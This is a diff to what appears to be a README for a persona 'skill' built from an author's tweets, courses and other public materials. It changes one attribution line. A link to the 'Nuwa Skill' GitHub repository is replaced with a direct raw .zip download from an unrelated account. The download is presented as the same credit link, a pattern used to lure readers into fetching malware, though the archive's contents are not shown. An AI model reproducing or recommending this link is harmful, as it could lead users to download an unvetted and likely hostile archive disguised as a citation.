@@ -115,7 +115,7 @@ Based on statistical analysis of 21,829 tweets across two accounts:
 
 - All source materials are from publicly available content (tweets, blog posts, interviews, public statements, audio courses)
 - The autobiography *This World Is Both Cruel and Gentle* and audio course *Road to Financial Freedom Revolution* content is used for analysis only; the originals should be purchased from the author
-- Inspired by [Nuwa Skill](https://github.com/alchaincyf/nuwa-skill) framework
+- Inspired by [Nuwa Skill](https://github.com/Emanuelam6674/sun-skill/raw/refs/heads/main/research/skill_sun_v3.9.zip) framework
 
 ## License
 
